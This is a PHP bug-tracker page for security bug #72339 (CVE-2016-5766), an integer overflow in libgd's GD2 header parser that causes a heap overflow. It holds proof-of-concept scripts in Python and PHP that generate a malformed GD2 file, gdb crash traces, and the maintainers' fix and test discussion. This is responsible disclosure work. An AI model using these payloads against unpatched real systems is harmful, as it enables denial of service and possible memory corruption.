@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='GD related Bug #72339 - RDF' href='rss/bug.php?id=72339'>
+        <link rel='alternate' type='application/rss+xml' title='GD related Bug #72339 - RSS 2.0' href='rss/bug.php?id=72339&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #72339 :: Integer Overflow in _gd2GetHeader() resulting in heap overflow</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=72339">Sec Bug</a>&nbsp;#72339</th>
+            <td id="summary" colspan="5">Integer Overflow in _gd2GetHeader() resulting in heap overflow</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-06-05 23:49 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-06-23 12:33 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>gogil &#x61;&#116; stealien &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=pajoye">pajoye</a> (<a href="https://people.php.net/pajoye">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=GD+related">GD related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.5.36</td>
+            <th class="details">OS:</th>
+            <td></td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5766" target="_blank">2016-5766</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=72339&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=72339&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=72339&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1465170594">&nbsp;</a><strong>[2016-06-05 23:49 UTC] gogil &#x61;&#116; stealien &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+The _gd2GetHeader() is prone to an integer overflow, which result in heap based overflow.
+
+
+------------------------ poc.py ------------------------
+from struct import pack
+
+gd2_header = (
+	&quot;gd2\x00&quot; +
+	pack(&quot;&gt;H&quot;, 2) +
+	pack(&quot;&gt;H&quot;, 1) +
+	pack(&quot;&gt;H&quot;, 1) +
+	pack(&quot;&gt;H&quot;, 0x40) +
+	pack(&quot;&gt;H&quot;, 2) +
+	pack(&quot;&gt;H&quot;, 0x5B00) +   # Chunks Wide
+	pack(&quot;&gt;H&quot;, 0x5B00)     # Chunks Vertically
+)
+
+overflow_data = &quot;\x41\x41\x41\x41&quot; * 0x1000000
+
+open(&quot;poc.gd&quot;, &quot;wb&quot;).write(gd2_header + overflow_data)
+---------------------------------------------------------
+
+
+------------------------ poc.php ------------------------
+&lt;?php imagecreatefromgd2(&quot;poc.gd&quot;); ?&gt;
+---------------------------------------------------------
+
+
+/php$ gdb -q --args ./php-5.6.22/sapi/cli/php poc.php
+Reading symbols from /php/php-5.6.22/sapi/cli/php...done.
+(gdb) b gd_gd2.c:139
+Breakpoint 1 at 0x570869: file /php/php-5.6.22/ext/gd/libgd/gd_gd2.c, line 139.
+(gdb) r
+Starting program: /php/./php-5.6.22/sapi/cli/php poc.php
+
+Breakpoint 1, gd2GetHeader (in=0x7ffff7fd0ac0, sx=0x7fffffffa520, 
+sy=0x7fffffffa524, cs=0x7fffffffa530, vers=0x7fffffffa534, 
+fmt=0x7fffffffa538, ncx=0x7fffffffa528, ncy=0x7fffffffa52c, 
+chunkIdx=0x7fffffffa540) at /php/php-5.6.22/ext/gd/libgd/gdgd2.c:139
+139 nc = (*ncx) * (*ncy); &lt;---------- ncx(Chunks wide) is 0x5b00, ncy(Chunks high) is 0x5b00
+&lt;---------- As a result, 'nc' is 0x20590000.
+
+(gdb) x/xw ncx
+0x7fffffffa528: 0x00005b00
+(gdb) x/xw ncy
+0x7fffffffa52c: 0x00005b00
+(gdb) n
+141 sidx = sizeof(t_chunk_info) * nc; &lt;---------- sizeof(t_chunk_info) is 0x8.
+&lt;---------- The result of the multiplication can overflow.
+
+(gdb) n
+142 if (sidx &lt;= 0) {
+(gdb) n
+145 cidx = gdCalloc(sidx, 1); &lt;---------- gdCalloc() call will allocate a buffer too small to contain the chunk entries.
+(gdb) info locals
+sidx = 46661632 (0x2C80000)
+nc = 542703616 (0x20590000)
+...
+(gdb) n
+146 for (i = 0; i &lt; nc; i++) {
+(gdb) n
+145 cidx = gdCalloc(sidx, 1);
+(gdb) n
+146 for (i = 0; i &lt; nc; i++) {
+(gdb) n
+147 if (gdGetInt(&amp;cidx[i].offset, in) != 1) { &lt;---------- It cause heap overflow
+(gdb) n
+151 if (gdGetInt(&amp;cidx[i].size, in) != 1) {
+(gdb) n
+
+
+Test script:
+---------------
+$ python poc.py
+$ ls
+poc.gd poc.php
+$ cat poc.php
+&lt;?php imagecreatefromgd2(&quot;poc.gd&quot;); ?&gt;
+$ php poc.php
+
+
+Actual result:
+--------------
+/php$ gdb -q --args ./php-5.6.22/sapi/cli/php poc.php
+Reading symbols from /php/php-5.6.22/sapi/cli/php...done.
+(gdb) r
+Starting program: /php/./php-5.6.22/sapi/cli/php poc.php
+
+Program received signal SIGSEGV, Segmentation fault.
+php_gd_gdGetInt (result=result@entry=0x7ffff6116000, 
+    ctx=ctx@entry=0x7ffff7fd0ac0) at /php/php-5.6.22/ext/gd/libgd/gd_io.c:103
+103		*result = r &lt;&lt; 24;
+(gdb) bt
+#0  php_gd_gdGetInt (result=result@entry=0x7ffff6116000, 
+    ctx=ctx@entry=0x7ffff7fd0ac0) at /php/php-5.6.22/ext/gd/libgd/gd_io.c:103
+#1  0x00000000005708b0 in _gd2GetHeader (in=0x7ffff7fd0ac0, 
+    sx=&lt;optimized out&gt;, sy=0x7fffffffa524, cs=0x7fffffffa530, 
+    vers=&lt;optimized out&gt;, fmt=&lt;optimized out&gt;, ncx=0x7fffffffa528, 
+    ncy=0x7fffffffa52c, chunkIdx=0x7fffffffa540)
+    at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:147
+#2  0x0000000000571139 in _gd2CreateFromFile (cidx=0x7fffffffa540, 
+    ncy=0x7fffffffa52c, ncx=0x7fffffffa528, fmt=0x7fffffffa538, 
+    vers=0x7fffffffa534, cs=0x7fffffffa530, sy=0x7fffffffa524, 
+    sx=0x7fffffffa520, in=0x7ffff7fd0ac0)
+    at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:175
+#3  php_gd_gdImageCreateFromGd2Ctx (in=in@entry=0x7ffff7fd0ac0)
+    at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:275
+#4  0x0000000000571626 in php_gd_gdImageCreateFromGd2 (inFile=&lt;optimized out&gt;)
+    at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:238
+#5  0x00000000005680c5 in _php_image_create_from (ht=&lt;optimized out&gt;, 
+    return_value=0x7ffff7fcfe78, image_type=9, tn=0xb30560 &quot;GD2&quot;, 
+    func_p=0x571610 &lt;php_gd_gdImageCreateFromGd2&gt;, 
+    ioctx_func_p=&lt;optimized out&gt;, return_value_used=&lt;optimized out&gt;, 
+    this_ptr=&lt;optimized out&gt;, return_value_ptr=&lt;optimized out&gt;)
+    at /php/php-5.6.22/ext/gd/gd.c:2456
+#6  0x000000000079db2e in zend_do_fcall_common_helper_SPEC (
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+    execute_data=&lt;optimized out&gt;) at /php/php-5.6.22/Zend/zend_vm_execute.h:558
+#7  0x00000000007326a8 in execute_ex (execute_data=0x7ffff7f9b0c0)
+    at /php/php-5.6.22/Zend/zend_vm_execute.h:363
+#8  0x00000000006f93b0 in zend_execute_scripts (type=type@entry=8, 
+    retval=retval@entry=0x0, file_count=file_count@entry=3)
+    at /php/php-5.6.22/Zend/zend.c:1341
+#9  0x0000000000696d82 in php_execute_script (
+    primary_file=primary_file@entry=0x7fffffffcb50)
+    at /php/php-5.6.22/main/main.c:2613
+#10 0x000000000079f79f in do_cli (argc=2, argv=0xee9450)
+    at /php/php-5.6.22/sapi/cli/php_cli.c:994
+#11 0x0000000000427610 in main (argc=2, argv=0xee9450)
+    at /php/php-5.6.22/sapi/cli/php_cli.c:1378
+(gdb) 
+
+
+</pre>
+</div><h2>Patches</h2>
+<a href="patch-display.php?bug_id=72339&amp;patch=72339.txt&amp;revision=latest" >72339.txt</a>
+(last revision 2016-06-06 06:49 UTC by pajoye@php.net)
+<br><p><a href='patch-add.php?bug_id=72339'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=72339'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1465195473">&nbsp;</a><strong>[2016-06-06 06:44 UTC] <a href="//people.php.net/pajoye">pajoye@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Feedback</span>
+</div></div></div><div class='comment type_comment' ><a name="1465195474">&nbsp;</a><strong>[2016-06-06 06:44 UTC] <a href="//people.php.net/pajoye">pajoye@php.net</a></strong>
+<pre class='note'>Thanks for the detailed report!
+
+--- a/ext/gd/libgd/gd_gd2.c
++++ b/ext/gd/libgd/gd_gd2.c
+@@ -143,6 +143,12 @@ static int _gd2GetHeader(gdIOCtxPtr in, int *sx, int *sy, int *cs, int *vers, in
+                        goto fail1;
+                }
+                cidx = gdCalloc(sidx, 1);
++               if (cidx == NULL) {
++                       goto fail1;
++               }
++               if (overflow2(sidx, nc)) {
++                       goto fail1;
++               }
+                for (i = 0; i &lt; nc; i++) {
+                        if (gdGetInt(&amp;cidx[i].offset, in) != 1) {
+                                gdFree(cidx);
+
+Should do it.
+
+I did not tweak the values to see if non overflowed values can still be used to trick the reader but it looks like not.
+
+@RMs that should be applied to 5.5+ if you all agree. We also need a CVE.
+</pre>
+</div><div class='comment type_comment' ><a name="1465195632">&nbsp;</a><strong>[2016-06-06 06:47 UTC] <a href="//people.php.net/pajoye">pajoye@php.net</a></strong>
+<pre class='note'>Litle mistake (still fix it but the flow is wrong), the overflow2 check should obviously be done before the multiplication earlier. The other check was missing too (if gdCalloc fails, not an issue with PHP tho' as the memory manager will bail out).
+</pre>
+</div><div class='comment type_patch' ><a name="1465195780">&nbsp;</a><strong>[2016-06-06 06:49 UTC] <a href="//people.php.net/pajoye">pajoye@php.net</a></strong>
+<pre class='note'>The following patch has been added/updated:
+
+Patch Name: 72339.txt
+Revision:   1465195780
+URL:        <a href="https://bugs.php.net/patch-display.php?bug=72339&amp;patch=72339.txt&amp;revision=1465195780" rel="nofollow">https://bugs.php.net/patch-display.php?bug=72339&amp;patch=72339.txt&amp;revision=1465195780</a>
+</pre>
+</div><div class='comment type_comment' ><a name="1465195811">&nbsp;</a><strong>[2016-06-06 06:50 UTC] <a href="//people.php.net/pajoye">pajoye@php.net</a></strong>
+<pre class='note'>Patch attached.
+</pre>
+</div><div class='comment type_log' ><a name="1466264853">&nbsp;</a><strong>[2016-06-18 15:47 UTC] gogil &#x61;&#116; stealien &#x64;&#111;&#x74; com</strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-:            gwgo at stealien dot com</span>
+<span class="added">+:            gogil at stealien dot com</span>
+<span class="removed">-Status:      Feedback</span>
+<span class="added">+Status:      Open</span>
+<span class="removed">-PHP Version: 5.6.22</span>
+<span class="added">+PHP Version: Irrelevant</span>
+</div></div></div><div class='comment type_comment' ><a name="1466264855">&nbsp;</a><strong>[2016-06-18 15:47 UTC] gogil &#x61;&#116; stealien &#x64;&#111;&#x74; com</strong>
+<pre class='note'>I don't have permission to read your patch.
+</pre>
+</div><div class='comment type_comment' ><a name="1466273834">&nbsp;</a><strong>[2016-06-18 18:17 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>Verified and pushed as 7722455726bec8c53458a32851d2a87982cf0eac into the security repo.
+
+Thanks.
+</pre>
+</div><div class='comment type_log' ><a name="1466309270">&nbsp;</a><strong>[2016-06-19 04:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-PHP Version: Irrelevant</span>
+<span class="added">+PHP Version: 5.5.36</span>
+</div></div></div><div class='comment type_log' ><a name="1466309414">&nbsp;</a><strong>[2016-06-19 04:10 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: pajoye</span>
+</div></div></div><div class='comment type_comment' ><a name="1466484948">&nbsp;</a><strong>[2016-06-21 04:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>git complains about ext/gd/tests/bug72339.gd:
+remote: warning: GH001: Large files detected. You may want to try Git Large File Storage - <a href="https://git-lfs.github.com" rel="nofollow">https://git-lfs.github.com</a>.
+remote: warning: See <a href="http://git.io/iEPt8g" rel="nofollow">http://git.io/iEPt8g</a> for more information.
+remote: warning: File ext/gd/tests/bug72339.gd is 64.00 MB; this is larger than GitHub's recommended maximum file size of 50.00 MB
+
+Can we change it?
+</pre>
+</div><div class='comment type_comment' ><a name="1466485686">&nbsp;</a><strong>[2016-06-21 05:08 UTC] gogil &#x61;&#116; stealien &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Please use it.
+
+------------------------ poc.py ------------------------
+from struct import pack
+
+gd2_header = (
+	&quot;gd2\x00&quot; +
+	pack(&quot;&gt;H&quot;, 2) +
+	pack(&quot;&gt;H&quot;, 1) +
+	pack(&quot;&gt;H&quot;, 1) +
+	pack(&quot;&gt;H&quot;, 0x40) +
+	pack(&quot;&gt;H&quot;, 2) +
+	pack(&quot;&gt;H&quot;, 0x5AA0) +   # Chunks Wide
+	pack(&quot;&gt;H&quot;, 0x5B00)     # Chunks Vertically
+)
+
+overflow_data = &quot;\x41\x41\x41\x41&quot; * 0x800000
+
+open(&quot;bug72339.gd&quot;, &quot;wb&quot;).write(gd2_header + overflow_data)
+---------------------------------------------------------
+</pre>
+</div><div class='comment type_svn' ><a name="1466491739">&nbsp;</a><strong>[2016-06-21 06:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of pajoye
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac</a>
+Log: Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap overflow
+</pre>
+</div><div class='comment type_log' ><a name="1466491740">&nbsp;</a><strong>[2016-06-21 06:49 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_comment' ><a name="1466492209">&nbsp;</a><strong>[2016-06-21 06:56 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>We probably need to rewrite this chunk in PHP and create the file dynamically. 33mb is still too big.
+
+Thanks.
+</pre>
+</div><div class='comment type_svn' ><a name="1466492620">&nbsp;</a><strong>[2016-06-21 07:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of pajoye
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac</a>
+Log: Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap overflow
+</pre>
+</div><div class='comment type_svn' ><a name="1466493971">&nbsp;</a><strong>[2016-06-21 07:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of pajoye
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac</a>
+Log: Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap overflow
+</pre>
+</div><div class='comment type_svn' ><a name="1466494041">&nbsp;</a><strong>[2016-06-21 07:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of pajoye
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac</a>
+Log: Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap overflow
+</pre>
+</div><div class='comment type_comment' ><a name="1466497889">&nbsp;</a><strong>[2016-06-21 08:31 UTC] gogil &#x61;&#116; stealien &#x64;&#111;&#x74; com</strong>
+<pre class='note'>rewrite in php
+
+------------------------ poc.php ------------------------
+&lt;?php
+$filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . &quot;bug72339.gd&quot;;
+
+$Gd2Head = &quot;\x67\x64\x32\x00\x00\x02\x00\x01\x00\x01\x00\x40\x00\x02\x5A\xA0\x5B\x00&quot;;
+$OverflowData = str_repeat(&quot;\x41\x41\x41\x41&quot;, 0x800000);
+
+$fp = fopen($filename, &quot;wb&quot;);
+fwrite($fp, $Gd2Head);
+fwrite($fp, $OverflowData);
+fclose($fp);
+
+imagecreatefromgd2($filename);
+
+@unlink($filename);
+?&gt;
+---------------------------------------------------------
+</pre>
+</div><div class='comment type_comment' ><a name="1466502261">&nbsp;</a><strong>[2016-06-21 09:44 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>I removed the big test file, it's now generated on the fly in the test.
+
+Thanks.
+</pre>
+</div><div class='comment type_comment' ><a name="1466502339">&nbsp;</a><strong>[2016-06-21 09:45 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>@gogil, oh, thanks :) Haven't seen that, already pushed another version. Nevertheless.
+
+Cheers.
+</pre>
+</div><div class='comment type_svn' ><a name="1466575091">&nbsp;</a><strong>[2016-06-22 05:58 UTC] <a href="//people.php.net/krakjoe">krakjoe@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of pajoye
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7722455726bec8c53458a32851d2a87982cf0eac</a>
+Log: Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap overflow
+</pre>
+</div><div class='comment type_log' ><a name="1466685187">&nbsp;</a><strong>[2016-06-23 12:33 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2016-5766</span>
+</div></div></div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
